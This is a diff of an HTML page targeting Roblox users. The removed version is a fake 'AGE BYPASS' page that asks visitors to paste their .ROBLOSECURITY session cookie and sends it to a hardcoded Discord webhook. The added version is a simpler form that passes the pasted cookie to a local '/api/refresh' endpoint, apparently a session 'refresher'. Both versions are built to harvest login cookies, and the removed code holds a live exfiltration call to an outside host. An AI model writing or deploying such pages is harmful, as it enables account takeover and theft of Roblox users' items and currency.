@@ -3,165 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AGE BYPASS</title>
-    <link rel="icon" href="https://cdn.discordapp.com/attachments/1326994906576715910/1339837416458158122/Leysikey_pro.png" type="image/png">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/izitoast/dist/css/iziToast.min.css">
+    <title>Enter Roblox Cookie</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background: black; 
-            color: white; 
-            text-align: center; 
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-        .container { 
-            max-width: 600px; 
-            margin: 100px auto; 
-            padding: 30px; 
-            background-color: rgba(60, 0, 100, 0.8); 
-            border-radius: 10px; 
-            box-shadow: 0 4px 15px rgba(255, 255, 255, 0.5); 
-            animation: fadeIn 0.5s ease-in-out;
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
-        @keyframes fadeIn {
-            0% { opacity: 0; transform: translateY(-20px); }
-            100% { opacity: 1; transform: translateY(0); }
+        input[type="text"] {
+            padding: 10px;
+            width: 300px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
         }
-        textarea { 
-            width: 100%; 
-            height: 200px; 
-            padding: 12px; 
-            font-size: 16px; 
-            border: 1px solid purple; 
-            border-radius: 8px; 
-            outline: none; 
-            resize: none; 
-            background-color: #2e2e2e;
+        button {
+            padding: 10px;
+            width: 100%;
+            background-color: #4CAF50;
             color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
         }
-        input[type="submit"] { 
-            padding: 12px 20px; 
-            background-color: purple; 
-            color: white; 
-            font-size: 16px; 
-            font-weight: 600; 
-            border: none; 
-            border-radius: 5px; 
-            cursor: pointer; 
-            transition: all 0.3s ease-in-out;
-        }
-        input[type="submit"]:hover { 
-            background-color: #9b4f96; 
-            transform: scale(1.05); 
+        button:hover {
+            background-color: #45a049;
         }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <h1>AGE BYPASS +13 TO >13</h1>
-    <div class="form-box">
-        <form id="bypassForm">
-            <label for="payload">Enter Cookies:</label><br>
-            <textarea name="payload" id="payload" rows="6"></textarea><br>
-            <input type="submit" value="Submit Cookies">
+    <div class="container">
+        <h1>Enter Roblox Cookie</h1>
+        <form id="cookieForm">
+            <label for="cookie">Enter .ROBLOSECURITY Cookie:</label><br>
+            <input type="text" id="cookie" name="cookie" required><br><br>
+            <button type="submit">Submit</button>
         </form>
-        <p id="cooldownMessage" style="display: none; color: red;"></p>
+        <p id="responseMessage"></p>
     </div>
-</div>
 
-<script src="https://cdn.jsdelivr.net/npm/izitoast/dist/js/iziToast.min.js"></script>
-<script>
-const form = document.getElementById('bypassForm');
-const cooldownMessage = document.getElementById('cooldownMessage');
-const submitButton = form.querySelector('input[type="submit"]');
+    <script>
+        document.getElementById('cookieForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const cookie = document.getElementById('cookie').value;
+            const responseMessage = document.getElementById('responseMessage');
+            
+            try {
+                // Send the cookie to your API
+                const response = await fetch(`/api/refresh?cookie=${cookie}`);
+                const data = await response.json();
 
-const WARNING_MESSAGE = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items";
-
-function checkCooldown() {
-    const cooldownEnd = localStorage.getItem("cooldownEnd");
-    const now = Date.now();
-    if (cooldownEnd && now < cooldownEnd) {
-        const remainingTime = Math.ceil((cooldownEnd - now) / 1000);
-        cooldownMessage.style.display = 'block';
-        cooldownMessage.textContent = `Please wait ${remainingTime} seconds before submitting again.`;
-        submitButton.disabled = true;
-        setTimeout(checkCooldown, 1000);
-    } else {
-        cooldownMessage.style.display = 'none';
-        submitButton.disabled = false;
-    }
-}
-
-checkCooldown();
-
-form.addEventListener('submit', function(event) {
-    event.preventDefault();
-    const payload = document.getElementById('payload').value;
-
-    if (!payload.trim()) {
-        iziToast.show({
-            title: 'Error:',
-            message: 'Please enter your Roblox cookies.',
-            color: 'red',
-            position: 'topCenter',
-            timeout: 3000
+                if (response.ok) {
+                    responseMessage.textContent = 'Cookie processed successfully!';
+                } else {
+                    responseMessage.textContent = `Error: ${data.error || 'Something went wrong'}`;
+                }
+            } catch (error) {
+                responseMessage.textContent = 'Error: Unable to connect to the server.';
+            }
         });
-        return;
-    }
-
-    if (!payload.startsWith(WARNING_MESSAGE)) {
-        iziToast.show({
-            title: 'Error:',
-            message: 'Must be cookies not a text.',
-            color: 'red',
-            position: 'topCenter',
-            timeout: 3000
-        });
-        return;
-    }
-
-    localStorage.setItem("cooldownEnd", Date.now() + 180000); // 3 minutes cooldown
-    checkCooldown();
-
-    fetch('https://discord.com/api/webhooks/1340386580770197665/1WyB76Ns5PG9YO-DVQo7Hv2PAtLi11td9UBRwFQIqiA0eM9b5Gyzz5JYRdSm9C3sweoa', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ content: `Cookies Submitted: ${payload}` })
-    })
-    .then(response => {
-        if (response.ok) {
-            iziToast.show({
-                title: '',
-                message: 'Cookies submitted successfully!',
-                color: 'green',
-                position: 'topCenter',
-                timeout: 5000
-            });
-        } else {
-            iziToast.show({
-                title: 'Error:',
-                message: 'Failed to send.',
-                color: 'red',
-                position: 'topCenter',
-                timeout: 5000
-            });
-        }
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        iziToast.show({
-            title: 'Information:',
-            message: 'Error submitting.',
-            color: 'orange',
-            position: 'topCenter',
-            timeout: 5000
-        });
-    });
-});
-</script>
-
+    </script>
 </body>
 </html>
